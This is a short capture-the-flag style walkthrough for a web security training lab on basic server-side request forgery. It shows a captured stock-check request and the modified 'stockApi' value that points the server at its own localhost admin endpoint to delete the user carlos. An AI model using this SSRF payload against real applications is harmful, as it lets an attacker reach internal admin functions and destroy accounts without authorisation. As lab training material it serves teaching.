**Lab: Basic SSRF against the local server**.  


_This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos._  

`SOLUTION`  

In the given request :-

```
POST /product/stock HTTP/1.1
Host: 0ac0005f04bdd71780e8e918009a0070.web-security-academy.net
Cookie: session=N5UhOwXHqprGPlPWknk54aDEEIbTmjfI
Content-Length: 107
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac0005f04bdd71780e8e918009a0070.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac0005f04bdd71780e8e918009a0070.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Change the `stockApi` to `stockApi=http://localhost/admin/delete?username=carlos` to get access to the admin page. The loopback request bypasses the auth checks and gives us the access to the admin page.

> THIS SOLVES THE LAB!

